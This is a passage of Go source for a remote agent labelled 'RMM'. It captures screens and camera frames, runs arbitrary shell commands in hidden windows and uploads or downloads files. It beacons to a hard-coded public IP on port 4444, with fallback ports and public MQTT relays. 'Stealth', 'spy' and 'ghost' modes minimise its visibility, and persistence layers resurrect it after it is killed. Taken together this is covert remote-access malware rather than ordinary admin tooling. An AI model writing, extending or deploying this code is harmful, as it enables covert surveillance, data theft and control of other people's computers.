package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"hash/fnv"
	"image"
	"image/jpeg"
	"image/png"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"rmm/internal/commands"
	"rmm/internal/mqttrelay"
	"rmm/internal/protocol"
	"rmm/internal/relay"
	"rmm/internal/version"
)

// captureImage captures a display. quality<=0 means PNG (lossless, desktop
// default); quality 1-100 means JPEG (a 1920x1080 frame drops from ~180KB
// PNG to ~40-80KB JPEG at q70). all=true captures the full virtual screen
// across every monitor (dual view); otherwise monitor selects the display
// halveRGBA downscales RGBA by 2x2 box average (dependency-free): half
// width/height = quarter pixels = ~4x smaller JPEGs for relay links.
func halveRGBA(src *image.RGBA) *image.RGBA {
	b := src.Bounds()
	w, h := b.Dx()/2, b.Dy()/2
	if w < 1 {
		w = 1
	}
	if h < 1 {
		h = 1
	}
	dst := image.NewRGBA(image.Rect(0, 0, w, h))
	maxX, maxY := b.Min.X+b.Dx()-1, b.Min.Y+b.Dy()-1
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			var r, g, bl, a uint32
			for dy := 0; dy < 2; dy++ {
				for dx := 0; dx < 2; dx++ {
					sx := b.Min.X + x*2 + dx
					if sx > maxX {
						sx = maxX
					}
					sy := b.Min.Y + y*2 + dy
					if sy > maxY {
						sy = maxY
					}
					i := src.PixOffset(sx, sy)
					r += uint32(src.Pix[i])
					g += uint32(src.Pix[i+1])
					bl += uint32(src.Pix[i+2])
					a += uint32(src.Pix[i+3])
				}
			}
			i := dst.PixOffset(x, y)
			dst.Pix[i] = uint8(r / 4)
			dst.Pix[i+1] = uint8(g / 4)
			dst.Pix[i+2] = uint8(bl / 4)
			dst.Pix[i+3] = uint8(a / 4)
		}
	}
	return dst
}

// encodeImage compresses one frame/tile: JPEG at quality, PNG when quality<=0.
func encodeImage(img image.Image, quality int) (data []byte, format string, err error) {
	var buf bytes.Buffer
	if quality > 0 {
		if quality > 100 {
			quality = 100
		}
		if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
			return nil, "", err
		}
		return buf.Bytes(), "jpeg", nil
	}
	if err := png.Encode(&buf, img); err != nil {
		return nil, "", err
	}
	return buf.Bytes(), "png", nil
}

// effectiveScale mirrors captureRaw's halve condition: the scale the frame
// geometry (w/h/ox/oy) is expressed in. Echoed on every screen/tile
// response so the UI converts clicks back to real pixels.
func effectiveScale(scale float64) float64 {
	if scale > 0 && scale < 1 {
		return scale
	}
	return 1
}

// index (out of range falls back to primary).
func captureRaw(monitor int, all bool, scale float64) (img *image.RGBA, w, h, ox, oy int, err error) {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return nil, 0, 0, 0, 0, fmt.Errorf("no displays")
	}
	bounds := screenshot.GetDisplayBounds(0)
	if all && n > 1 {
		minX, minY := bounds.Min.X, bounds.Min.Y
		maxX, maxY := bounds.Max.X, bounds.Max.Y
		for i := 1; i < n; i++ {
			b := screenshot.GetDisplayBounds(i)
			if b.Min.X < minX {
				minX = b.Min.X
			}
			if b.Min.Y < minY {
				minY = b.Min.Y
			}
			if b.Max.X > maxX {
				maxX = b.Max.X
			}
			if b.Max.Y > maxY {
				maxY = b.Max.Y
			}
		}
		bounds = image.Rect(minX, minY, maxX, maxY)
	} else if monitor > 0 && monitor < n {
		bounds = screenshot.GetDisplayBounds(monitor)
	}
	cimg, cerr := screenshot.CaptureRect(bounds)
	if cerr != nil {
		return nil, 0, 0, 0, 0, cerr
	}
	img = cimg
	w, h = bounds.Dx(), bounds.Dy()
	ox, oy = bounds.Min.X, bounds.Min.Y
	if scale > 0 && scale < 1 {
		// Half detail for relay links: origin scales too so w/h/ox/oy
		// stay in one consistent (scaled) space. The effective scale is
		// echoed on every frame (FrameScale) so the UI converts clicks
		// back to real pixels.
		img = halveRGBA(img)
		w /= 2
		h /= 2
		ox /= 2
		oy /= 2
	}
	return img, w, h, ox, oy, nil
}

// captureImage is captureRaw + encode (full frames; tile path below uses
// captureRaw directly so it can compare pre-encode pixels).
func captureImage(quality, monitor int, all bool, scale float64) (data []byte, w, h, ox, oy int, format string, err error) {
	if !modeCanScreen() {
		return nil, 0, 0, 0, 0, "", fmt.Errorf("%s", commands.ModeDenied(agentMode))
	}
	img, w, h, ox, oy, err := captureRaw(monitor, all, scale)
	if err != nil {
		return nil, 0, 0, 0, 0, "", err
	}
	data, format, err = encodeImage(img, quality)
	if err != nil {
		return nil, 0, 0, 0, 0, "", err
	}
	return data, w, h, ox, oy, format, nil
}

func captureScreen() ([]byte, int, int, error) {
	data, w, h, _, _, _, err := captureImage(0, 0, false, 0)
	return data, w, h, err
}

// Tile-diff streaming: desktop screens are ~95% static between frames, so
// only changed 128px tiles are sent (each a small JPEG), plus a full
// keyframe every tileKeyframeEvery generations to heal any desync. Static
// screen = near-zero bytes; full motion degrades gracefully to keyframes.
const tileSize = 128
const tileKeyframeEvery = 30

type tileCache struct {
	key string // dims+scale+monitor+all: any change forces a keyframe
	w, h int
	stride int // row bytes of pix (RGBA stride, not assumed == w*4)
	pix  []byte // last-sent RGBA pixels
	gen  uint64
}

var tileMu sync.Mutex
var tileCur *tileCache

func hashTile(pix []byte, stride, x, y, tw, th int) uint64 {
	h := fnv.New64a()
	for row := 0; row < th; row++ {
		off := (y+row)*stride + x*4
		h.Write(pix[off : off+tw*4])
	}
	return h.Sum64()
}

// diffRects compares two same-stride RGBA buffers tile by tile, returning
// changed tile rects [x,y,w,h] and the changed-pixel ratio. Pure function:
// the unit-tested core of tile-diff streaming.
func diffRects(cur, prev []byte, stride, w, h int) (changed [][4]int, ratio float64) {
	nx, ny := (w+tileSize-1)/tileSize, (h+tileSize-1)/tileSize
	for ty := 0; ty < ny; ty++ {
		for tx := 0; tx < nx; tx++ {
			x, y := tx*tileSize, ty*tileSize
			tw, th := tileSize, tileSize
			if x+tw > w {
				tw = w - x
			}
			if y+th > h {
				th = h - y
			}
			if hashTile(cur, stride, x, y, tw, th) != hashTile(prev, stride, x, y, tw, th) {
				changed = append(changed, [4]int{x, y, tw, th})
			}
		}
	}
	if w*h == 0 {
		return changed, 0
	}
	return changed, float64(len(changed)*tileSize*tileSize) / float64(w*h)
}

// captureTiled captures and diffs against the last-sent frame, returning
// ready-to-publish messages: one TypeScreen keyframe, or zero+ TypeTile
// (same FSeq generation). Zero tiles = single empty TypeScreen heartbeat so
// the UI knows the stream is alive with nothing changed. (nil, nil) means
// superseded mid-capture: a newer frame already published, drop silently.
func captureTiled(quality, monitor int, all bool, scale float64) (msgs []protocol.Message, err error) {
	if !modeCanScreen() {
		return nil, fmt.Errorf("%s", commands.ModeDenied(agentMode))
	}
	s0 := frameSeq.Load()
	img, w, h, ox, oy, err := captureRaw(monitor, all, scale)
	if err != nil {
		return nil, err
	}
	if frameSeq.Load() != s0 {
		return nil, nil // superseded during capture; UI would drop this frame
	}
	key := fmt.Sprintf("%dx%d/s%v/m%d/a%v", w, h, scale, monitor, all)
	es := effectiveScale(scale)
	tq := quality
	if tq <= 0 {
		tq = 70 // tiles are a streaming path: JPEG even if full frames use PNG
	}
	tileMu.Lock()
	defer tileMu.Unlock()
	keyframe := tileCur == nil || tileCur.key != key || tileCur.w != w || tileCur.h != h || tileCur.stride != img.Stride || (tileCur.gen+1)%tileKeyframeEvery == 1
	cur := img.Pix
	gen := nextFrameSeq()
	if !keyframe {
		ch, ratio := diffRects(cur, tileCur.pix, img.Stride, w, h)
		if len(ch) == 0 {
			tileCur.gen = gen
			return []protocol.Message{{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, FSeq: gen, Scale: es}}, nil
		}
		if ratio < 0.7 {
			// Changed region is small: send tiles. (SubImage rect is in
			// image space: offset by Bounds Min for multi-monitor captures.)
			mn := img.Bounds().Min
			cp := append([]byte(nil), cur...)
			for _, c := range ch {
				sub := img.SubImage(image.Rect(mn.X+c[0], mn.Y+c[1], mn.X+c[0]+c[2], mn.Y+c[1]+c[3]))
				data, _, err := encodeImage(sub, tq)
				if err != nil {
					return nil, err
				}
				msgs = append(msgs, protocol.Message{Type: protocol.TypeTile, Width: c[2], Height: c[3], OX: ox + c[0], OY: oy + c[1], Data: base64.StdEncoding.EncodeToString(data), Format: "jpeg", FSeq: gen, Scale: es})
			}
			tileCur.pix = cp
			tileCur.gen = gen
			return msgs, nil
		}
		keyframe = true // most of the frame changed: keyframe is cheaper
	}
	data, format, err := encodeImage(img, quality)
	if err != nil {
		return nil, err
	}
	tileCur = &tileCache{key: key, w: w, h: h, stride: img.Stride, pix: append([]byte(nil), cur...), gen: gen}
	return []protocol.Message{{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: base64.StdEncoding.EncodeToString(data), Format: format, FSeq: gen, Scale: es}}, nil
}

func runCommand(cmdStr string) (string, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", cmdStr)
		hideWatchCmd(cmd)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}
	// Limit output to 1MB to avoid blowing scanner buffer
	out, err := cmd.CombinedOutput()
	if len(out) > 1024*1024 {
		out = out[:1024*1024]
	}
	if err != nil {
		// Still return output; include error
		return string(out), err.Error()
	}
	return string(out), ""
}

// splitCmd parses "cmd args..." into name + args.
func splitCmd(cmdStr string) (string, string) {
	cmdName := strings.TrimSpace(cmdStr)
	args := ""
	if idx := strings.Index(cmdName, " "); idx != -1 {
		args = strings.TrimSpace(cmdName[idx+1:])
		cmdName = strings.TrimSpace(cmdName[:idx])
	}
	return cmdName, args
}

// isKillCmd reports whether cmdStr asks the agent process to go quiet.
// kill-agent is intercepted in agent main on every transport (direct,
// MQTT) before commands.Execute ever sees it. Quiet is temporary: the
// supervisor restarts the process, so this never deletes anything.
func isKillCmd(cmdStr string) bool {
	name, _ := splitCmd(cmdStr)
	switch strings.ToLower(name) {
	case "kill-agent", "agent-kill", "agent-exit":
		return true
	}
	return false
}

// exitSoon quiets the agent process after a short grace period so the
// goodbye output still flushes. Deliberately touches NOTHING persistent:
// no task is disabled, no key removed. The watcher/WMI/service resurrect
// the process within ~a minute, so kill-agent is a temporary quiet, never
// a cleanup. Permanent removal is only via the token-guarded self-delete
// command or Agent-Setup --uninstall.
func exitSoon(via string) {
	log.Printf("[*] kill-agent (%s) — quieting process (supervisor will restart it)", via)
	go func() {
		time.Sleep(800 * time.Millisecond)
		os.Exit(0)
	}()
}

// fileDlStream answers one download request by streaming file chunks via
// send (transport-specific). Out-of-order arrival is fine: the UI
// reassembles by seq and re-requests gaps from the first missing seq.
func fileDlStream(path string, fromSeq int, haveStr string, chunkRaw int, thumb bool, send func(protocol.Message) error) {
	if chunkRaw <= 0 {
		chunkRaw = 512 * 1024
	}
	// Thumbnail preview: one small JPEG, instant render. Falls back to the
	// full file when the source isn't a decodable image.
	if thumb && fromSeq == 0 {
		if data, err := commands.MakeThumb(path); err == nil {
			sum := sha256.Sum256(data)
			_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: 0, FileTotal: 1, FileSize: int64(len(data)), FileSHA: hex.EncodeToString(sum[:]), Data: base64.StdEncoding.EncodeToString(data)})
			return
		}
	}
	// Directories auto-zip (deterministic temp file, removed after).
	realPath, displayName, cleanup, err := commands.ResolveDlSource(path)
	if err != nil {
		_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, Error: err.Error()})
		return
	}
	if cleanup {
		defer os.Remove(realPath)
	}
	man, err := commands.FileDlManifest(realPath, chunkRaw)
	if err != nil {
		_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, Error: err.Error()})
		return
	}
	log.Printf("[*] File download %s (%s, %d bytes, %d chunks from %d)", path, displayName, man.Size, man.Total, fromSeq)
	// Selective resume: the requester lists ranges it already holds; send
	// only what's missing instead of a wasteful fromSeq..end suffix.
	have := map[int]bool{}
	if haveStr != "" {
		have = commands.ParseRanges(haveStr, man.Total)
	}
	var seqs []int
	for seq := fromSeq; seq < man.Total; seq++ {
		if !have[seq] {
			seqs = append(seqs, seq)
		}
	}
	if len(seqs) == 0 {
		return // requester already holds everything
	}
	// Relay-sized chunks go out over 2 lanes with pacing (back-to-back
	// 175KB QoS0 publishes collapse on public brokers — same lesson as
	// update pushes); direct-sized chunks stay serial at full speed.
	lanes, pacing := 1, time.Duration(0)
	if chunkRaw <= 128*1024 {
		lanes, pacing = 2, 40*time.Millisecond
	}
	if lanes == 1 {
		for _, seq := range seqs {
			data, err := commands.FileDlChunk(realPath, seq, chunkRaw)
			if err != nil {
				_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, Error: err.Error()})
				return
			}
			if err := send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, FileSize: man.Size, FileSHA: man.SHA, Data: data}); err != nil {
				log.Printf("[!] file-dl send: %v", err)
				return
			}
		}
		return
	}
	var wg sync.WaitGroup
	var failOnce sync.Once
	failed := atomic.Bool{}
	jobs := make(chan int, len(seqs))
	for _, seq := range seqs {
		jobs <- seq
	}
	close(jobs)
	for l := 0; l < lanes; l++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for seq := range jobs {
				if failed.Load() {
					return
				}
				data, err := commands.FileDlChunk(realPath, seq, chunkRaw)
				if err != nil {
					failOnce.Do(func() {
						failed.Store(true)
						_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, Error: err.Error()})
					})
					return
				}
				if err := send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, FileSize: man.Size, FileSHA: man.SHA, Data: data}); err != nil {
					failOnce.Do(func() {
						failed.Store(true)
						log.Printf("[!] file-dl send: %v", err)
					})
					return
				}
				if pacing > 0 {
					time.Sleep(pacing)
				}
			}
		}()
	}
	wg.Wait()
}

// sendCamFrags delivers a command result, splitting multi-line CAMFRAG
// camera results into one output per fragment so each rides its own QoS0
// publish (a single giant publish is all-or-nothing loss). All other
// results pass through as one output.
func sendCamFrags(cmdID, result, errStr string, send func(protocol.Message) error) {
	if strings.Contains(result, "CAMFRAG ") {
		lines := strings.Split(result, "\n")
		if len(lines) > 1 {
			allFrag := true
			for _, ln := range lines {
				if !strings.HasPrefix(strings.TrimSpace(ln), "CAMFRAG ") {
					allFrag = false
					break
				}
			}
			if allFrag {
				for _, ln := range lines {
					_ = send(protocol.Message{Type: protocol.TypeOutput, Result: strings.TrimSpace(ln), Error: errStr, CmdID: cmdID})
				}
				return
			}
		}
	}
	_ = send(protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr, CmdID: cmdID})
}

// updateOutput builds an output message from a result/error pair (shared
// by the self-update handlers on every transport).
func updateOutput(res string, err error) protocol.Message {
	if err != nil {
		if res == "" {
			return protocol.Message{Type: protocol.TypeOutput, Result: err.Error()}
		}
		return protocol.Message{Type: protocol.TypeOutput, Result: res, Error: err.Error()}
	}
	return protocol.Message{Type: protocol.TypeOutput, Result: res}
}

// execCommand runs a command string and delivers the output message(s)
// via send (CAMFRAG camera results split per fragment). maxBytes caps the
// result (direct TLS allows 1MB, relays less). A duplicate id (two
// controllers, same command) sends an empty ack and returns suppressed.
func execCommand(cmdStr, cmdID string, maxBytes int, truncNote string, send func(protocol.Message) error) bool {
	t := time.Now()
	cmdName, args := splitCmd(cmdStr)
	result, suppressed, err := commands.ExecuteChecked(cmdID, cmdName, args)
	if suppressed {
		log.Printf("[*] Duplicate %s suppressed", cmdID)
		_ = send(protocol.Message{Type: protocol.TypeOutput, CmdID: cmdID})
		return true
	}
	dlog.Printf("[cmd] %q took %dms err=%v", cmdName, time.Since(t).Milliseconds(), err)
	errStr := ""
	if err != nil {
		errStr = err.Error()
		if result == "" {
			result = errStr
			errStr = ""
		}
	}
	if len(result) > maxBytes {
		result = result[:maxBytes] + truncNote
	}
	sendCamFrags(cmdID, result, errStr, send)
	return false
}

func mustJSON(v interface{}) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

func nowMillis() int64 { return time.Now().UnixMilli() }

// frameSeq numbers captures in completion order across all transports so
// the UI can drop stale arrivals when pipelining requests.
var frameSeq atomic.Uint64

func nextFrameSeq() uint64 { return frameSeq.Add(1) }

// captureSem bounds concurrent screen captures across all transports. A
// deep UI pipe (10-20 in flight) spawns one goroutine per request; without
// a bound, a weak remote PC melts under 20 simultaneous full-screen
// captures + JPEG encodes and effective fps collapses. Full house drops
// the frame with an empty heartbeat so the UI pipe keeps flowing.
// Cap 6 (was 3): the 20-deep UI pipe starved at 3 on healthy remotes.
var captureSem = make(chan struct{}, 6)

func captureSlot() bool {
	select {
	case captureSem <- struct{}{}:
		return true
	default:
		return false
	}
}

func releaseSlot() { <-captureSem }

// instanceID stably identifies this agent process (hostname-pid) so the
// controller can tell two processes on one host apart.
func instanceID() string {
	hn, _ := os.Hostname()
	if hn == "" {
		hn = "unknown"
	}
	return fmt.Sprintf("%s-%d", hn, os.Getpid())
}

// rollbackNotice, when non-nil, reports a watchdog-executed rollback of a
// crash-looping update. Attached to every hello so the controller alarms
// and holds back the bad version.
var rollbackNotice *commands.RollbackNotice

// agentMode is the operation mode loaded once at startup (set-mode
// restarts the process, so it never changes under us).
var agentMode = commands.ModeNormal

// Mode behavior gates (v1.42.3): centralized so all four transports share
// one policy. set-mode restarts the process, so agentMode never changes.
func modeCanScreen() bool {
	switch agentMode {
	case commands.ModeNormal, commands.ModePerformance, commands.ModeKiosk, commands.ModeAudit:
		return true
	}
	return false
}

func modeCanMouse() bool {
	return agentMode == commands.ModeNormal || agentMode == commands.ModePerformance
}

// announceEvery stretches presence check-ins in quiet modes (stealth/spy
// whisper just under the 90s stale cutoff; performance hurries).
func announceEvery(base time.Duration) time.Duration {
	switch agentMode {
	case commands.ModeStealth, commands.ModeSpy, commands.ModeGhost:
		if base < 60*time.Second {
			return 60 * time.Second
		}
	case commands.ModePerformance:
		return 15 * time.Second
	}
	return base
}

// helloMsg builds the TypeConnect announcement, carrying any rollback report.
func helloMsg(hn, user string) protocol.Message {
	layers, alarm := readProtection()
	m := protocol.Message{Type: protocol.TypeConnect, Hostname: hn, User: user, Instance: instanceID(), Version: version.DesktopAgentVersion, Auth: commands.AgentToken(), Prot: layers, ProtDetail: alarm, Mode: agentMode}
	if rollbackNotice != nil {
		m.RollbackBad = rollbackNotice.Bad
		m.RollbackTo = rollbackNotice.To
	}
	return m
}

// readProtection returns the watcher's persistence-layer score ("5/6")
// plus any sticky tamper tripwire. Empty score = unknown (watcher not yet
// run or old install).
func readProtection() (string, string) {
	dir := filepath.Join(os.TempDir(), "RMM")
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	}
	b, err := os.ReadFile(filepath.Join(dir, "protection.json"))
	if err != nil {
		return "", ""
	}
	var p struct {
		Layers string `json:"layers"`
		Alarm  string `json:"alarm"`
	}
	if json.Unmarshal(b, &p) != nil {
		return "", ""
	}
	return p.Layers, p.Alarm
}

// noteAck consumes the rollback notice once the controller acks it, so the
// report survives controller restarts (re-sent on every hello) without
// repeating forever after it lands.
func noteAck(msg protocol.Message) {
	if msg.RollbackAck && rollbackNotice != nil {
		log.Printf("[*] Controller acked rollback report, clearing notice")
		commands.ConsumeRollbackNotice()
		rollbackNotice = nil
	}
}

func hostnameAndUser() (string, string) {
	hn, _ := os.Hostname()
	if hn == "" {
		hn = "unknown"
	}
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}
	if user == "" {
		user = "unknown"
	}
	return hn, user
}

type agent struct {
	controllerAddr string
	caFile         string
	insecure       bool
	screenshotFPS  float64
	conn           net.Conn
	enc            *json.Encoder
	mu             sync.Mutex
	closing        chan struct{}
	// quietUntil (UnixNano) pauses reconnects after the user ends the
	// session from the controller. The service keeps running; it just
	// stays quiet instead of instantly reappearing. Never touches the PC.
	quietUntil atomic.Int64
	// ghostEnd, when non-nil, fires to end the current session: ghost
	// mode serves ~60s windows, then goes dark until the next cycle.
	ghostEnd <-chan time.Time
}

// disconnectQuiet is how long the agent stays quiet after a user disconnect.
const disconnectQuiet = 5 * time.Minute

func (a *agent) setQuiet(d time.Duration) {
	a.quietUntil.Store(time.Now().Add(d).UnixNano())
	log.Printf("[*] Session ended by controller — staying quiet for %s (service keeps running, PC untouched)", d)
}

// setQuietSilent sleeps without the disconnect log line (ghost cycles).
func (a *agent) setQuietSilent(d time.Duration) {
	a.quietUntil.Store(time.Now().Add(d).UnixNano())
	log.Printf("[*] Ghost window over — dark for %s", d.Round(time.Second))
}

func (a *agent) quietRemain() time.Duration {
	rem := time.Until(time.Unix(0, a.quietUntil.Load()))
	if rem < 0 {
		return 0
	}
	return rem
}

func (a *agent) send(msg protocol.Message) error {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.enc == nil {
		return fmt.Errorf("no connection")
	}
	return a.enc.Encode(msg)
}

// defaultHouses preserves the historical HouseA/HouseB behavior when no
// houses.txt exists next to the exe.
var defaultHouses = []string{"176.229.98.54:4444", "192.168.68.57:4444"}

// parseHouseLines reads host:port lines (# comments + blanks skipped;
// bare host gets :4444).
func parseHouseLines(s string) []string {
	var out []string
	for _, ln := range strings.Split(s, "\n") {
		ln = strings.TrimSpace(strings.TrimSpace(ln))
		if ln == "" || strings.HasPrefix(ln, "#") {
			continue
		}
		if !strings.Contains(ln, ":") {
			ln += ":4444"
		}
		out = append(out, ln)
	}
	return out
}

// loadHouses returns the controller houses to roam across: houses.txt next
// to the exe (then CWD), else the compiled-in defaults. Re-read on every
// reconnect so editing the file needs no restart.
func loadHouses() []string {
	var houses []string
	if exe, err := os.Executable(); err == nil {
		if b, err := os.ReadFile(filepath.Join(filepath.Dir(exe), "houses.txt")); err == nil {
			houses = append(houses, parseHouseLines(string(b))...)
		}
	}
	if b, err := os.ReadFile("houses.txt"); err == nil {
		houses = append(houses, parseHouseLines(string(b))...)
	}
	if len(houses) == 0 {
		return append([]string(nil), defaultHouses...)
	}
	seen := map[string]bool{}
	var uniq []string
	for _, h := range houses {
		if !seen[h] {
			seen[h] = true
			uniq = append(uniq, h)
		}
	}
	return uniq
}

// dialAddrs returns primary + per-house fallbacks on already-open ports
// (22,53,443,4444), so one agent install roams every reachable house.
func dialAddrs(primary string, houses []string) []string {
	var addrsToTry []string
	addrsToTry = append(addrsToTry, primary)
	for _, h := range houses {
		host, port, err := net.SplitHostPort(h)
		if err != nil {
			host, port = h, "4444"
		}
		addrsToTry = append(addrsToTry, net.JoinHostPort(host, port))
		for _, p := range []string{"4444", "443", "22", "53"} {
			if p == port {
				continue
			}
			addrsToTry = append(addrsToTry, net.JoinHostPort(host, p))
		}
	}
	addrsToTry = append(addrsToTry, "127.0.0.1:4444", "127.0.0.1:443")
	seen := map[string]bool{}
	var uniq []string
	for _, addr := range addrsToTry {
		if !seen[addr] {
			seen[addr] = true
			uniq = append(uniq, addr)
		}
	}
	return uniq
}

type dialResult struct {
	conn net.Conn
	addr string
}

// lastGoodPath caches the winning dial address next to the exe.
func lastGoodPath() string {
	if exe, err := os.Executable(); err == nil {
		return filepath.Join(filepath.Dir(exe), "lastgood.txt")
	}
	return filepath.Join(os.TempDir(), "lastgood.txt")
}

func loadLastGood() string {
	b, err := os.ReadFile(lastGoodPath())
	if err != nil {
		return ""
	}
	if lg := strings.TrimSpace(strings.Split(string(b), "\n")[0]); lg != "" {
		return lg
	}
	return ""
}

func saveLastGood(addr string) {
	_ = os.WriteFile(lastGoodPath(), []byte(addr+"\n"), 0644)
}

// raceDials dials every candidate concurrently; the first success wins and
// losers are closed. Returns the winning conn + addr, or the last error
// when every dial failed.
func raceDials(addrs []string, baseCfg *tls.Config, insecure bool, caFile string) (net.Conn, string, error) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	winCh := make(chan dialResult, 1)
	doneCh := make(chan struct{})
	var mu sync.Mutex
	pending := len(addrs)
	var lastErr error
	tryWin := func(conn net.Conn, addr string) {
		select {
		case winCh <- dialResult{conn, addr}:
		default:
			conn.Close() // lost the race
		}
	}
	for _, addr := range addrs {
		go func(addr string) {
			useCfg := baseCfg
			if strings.Contains(addr, "192.168.") && !insecure {
				clone := baseCfg.Clone()
				clone.InsecureSkipVerify = true
				useCfg = clone
			}
			td := &tls.Dialer{NetDialer: dialer, Config: useCfg}
			conn, err := td.DialContext(ctx, "tcp", addr)
			mu.Lock()
			defer mu.Unlock()
			if err != nil {
				log.Printf("[!] Dial %s failed: %v", addr, err)
				lastErr = err
			} else {
				tryWin(conn, addr)
			}
			if pending--; pending == 0 {
				close(doneCh)
			}
		}(addr)
	}
	select {
	case w := <-winCh:
		return w.conn, w.addr, nil
	case <-doneCh:
		mu.Lock()
		defer mu.Unlock()
		if lastErr == nil {
			lastErr = fmt.Errorf("no dial candidates")
		}
		return nil, "", lastErr
	}
}

func (a *agent) connectOnce() error {
	var tlsCfg *tls.Config
	if a.insecure {
		tlsCfg = &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	} else {
		caData, err := os.ReadFile(a.caFile)
		if err != nil {
			return fmt.Errorf("read ca %s: %w", a.caFile, err)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(caData) {
			return fmt.Errorf("failed to parse CA cert %s", a.caFile)
		}
		tlsCfg = &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}
	}

	// Last-good first: the winner of the previous race dials first, so a
	// stable setup reconnects in ~one RTT instead of re-racing everything.
	uniqAddrs := dialAddrs(a.controllerAddr, loadHouses())
	if lg := loadLastGood(); lg != "" {
		uniqAddrs = append([]string{lg}, uniqAddrs...)
		seen := map[string]bool{}
		dedup := uniqAddrs[:0]
		for _, x := range uniqAddrs {
			if !seen[x] {
				seen[x] = true
				dedup = append(dedup, x)
			}
		}
		uniqAddrs = dedup
	}
	// Happy-eyeballs race: dial every candidate concurrently, first success
	// wins. Worst case is one timeout (~5s), not the sum of all of them.
	conn, dialAddr, dialErr := raceDials(uniqAddrs, tlsCfg, a.insecure, a.caFile)
	var err error
	if dialErr == nil {
		log.Printf("[+] Connected to %s", dialAddr)
		a.controllerAddr = dialAddr
		saveLastGood(dialAddr)
		err = nil
	} else {
		log.Printf("[!] All direct dials failed: %v", dialErr)
		err = dialErr
	}
	// MQTT relay (persistent outbound TCP). Ntfy was removed in v1.45:
	// direct or MQTT, nothing else.
	if err != nil {
		log.Printf("[*] All direct dials failed, trying MQTT relay...")
		if merr := a.connectViaMQTT(); merr != nil {
			log.Printf("[!] MQTT failed: %v", merr)
			err = merr
		} else {
			return nil // connectViaMQTT only returns on shutdown
		}
	}
	if err != nil {
		return err
	}
	a.conn = conn
	a.enc = json.NewEncoder(conn)
	log.Printf("[+] Connected to %s", a.controllerAddr)

	// Send connect
	hn, user := hostnameAndUser()
	if err := a.send(helloMsg(hn, user)); err != nil {
		conn.Close()
		return fmt.Errorf("send connect: %w", err)
	}

	// Channels
	done := make(chan struct{})
	errCh := make(chan error, 1)

	// Reader
	go func() {
		defer close(done)
		scanner := bufio.NewScanner(conn)
		buf := make([]byte, 64*1024)
		scanner.Buffer(buf, 2*1024*1024) // commands are small; screen requests are tiny
		for scanner.Scan() {
			line := scanner.Bytes()
			if len(line) == 0 {
				continue
			}
			var msg protocol.Message
			if err := json.Unmarshal(line, &msg); err != nil {
				log.Printf("[!] bad json: %v raw=%.200s", err, string(line))
				continue
			}
			switch msg.Type {
			case protocol.TypeConnected:
				noteAck(msg)
				log.Printf("[+] Controller acknowledged id=%s", msg.ID)
			case protocol.TypeUpdateBegin:
				log.Printf("[*] Update begin %s (%d bytes, %d chunks)", msg.UpdateVer, msg.UpdateSize, msg.UpdateTotal)
				go func(m protocol.Message) {
					res, err := commands.StartAgentUpdate(m.UpdateVer, m.UpdateSize, m.UpdateSHA, m.UpdateTotal, m.UpdateGzip, m.UpdateChunk)
					_ = a.send(updateOutput(res, err))
				}(msg)
			case protocol.TypeUpdateChunk:
				go func(m protocol.Message) {
					res, err := commands.WriteUpdateChunk(m.UpdateSeq, m.Data)
					if res == "" && err == nil {
						return
					}
					_ = a.send(updateOutput(res, err))
				}(msg)
			case protocol.TypeFileDlReq:
				go func(m protocol.Message) {
					fileDlStream(m.FilePath, m.FileFrom, m.FileHave, m.FileChunk, m.FileThumb, a.send)
				}(msg)
			case protocol.TypeFileUlBegin:
				go func(m protocol.Message) {
					res, err := commands.StartFileUl(m.FilePath, m.FileSize, m.FileSHA, m.FileTotal)
					_ = a.send(updateOutput(res, err))
				}(msg)
			case protocol.TypeFileUlChunk:
				go func(m protocol.Message) {
					res, err := commands.WriteFileUlChunk(m.FileSeq, m.Data, m.FileChunk)
					if res == "" && err == nil {
						return
					}
					_ = a.send(updateOutput(res, err))
				}(msg)
			case protocol.TypeCommand:
				log.Printf("[*] Command: %s", msg.Cmd)
				go func(m protocol.Message) {
					cmdStr := m.Cmd
					if isKillCmd(cmdStr) {
						_ = a.send(protocol.Message{Type: protocol.TypeOutput, Result: "agent process quieting (kill-agent is temporary — supervisor restarts it)"})
						exitSoon("direct")
						return
					}
					if handleSelfDelete(cmdStr, func(res, errStr string) {
						_ = a.send(protocol.Message{Type: protocol.TypeOutput, Result: res, Error: errStr, CmdID: m.CmdID})
					}) {
